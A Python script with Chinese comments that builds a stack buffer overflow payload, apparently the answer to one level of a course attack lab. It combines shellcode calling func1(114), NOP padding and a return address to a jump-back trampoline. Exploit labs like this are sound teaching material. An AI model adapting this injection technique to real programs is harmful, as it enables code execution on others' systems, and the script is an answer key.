import struct

# 1. 构造 Shellcode
# 目标：调用 func1(114)
# func1 address: 0x401216
# argument: 114 (0x72)

# Assembly:
# mov rdi, 0x72
# mov rax, 0x401216
# call rax

shellcode = b""
shellcode += b"\x48\xc7\xc7\x72\x00\x00\x00"  # mov rdi, 0x72
shellcode += b"\x48\xc7\xc0\x16\x12\x40\x00"  # mov rax, 0x401216
shellcode += b"\xff\xd0"                      # call rax

# 2. Padding
# 我们需要填充到 40 字节 (32 bytes Buffer + 8 bytes Saved RBP)
# Payload 目前长度是 16 字节
# 剩下的用 NOP (\x90) 填充，作为滑梯 (NOP Sled)
padding_length = 40 - len(shellcode)
padding = b"\x90" * padding_length

# 3. Return Address
# 覆盖为 jmp_xs 的地址，它会自动跳转回 buffer 开头
jmp_xs_addr = 0x401334
ret_addr = struct.pack('<Q', jmp_xs_addr)

# 4. 组合 Payload
# 结构: [Shellcode] + [NOP Padding] + [jmp_xs Address]
payload = shellcode + padding + ret_addr

# 5. 写入文件
with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Payload generated! Length: {len(payload)}")
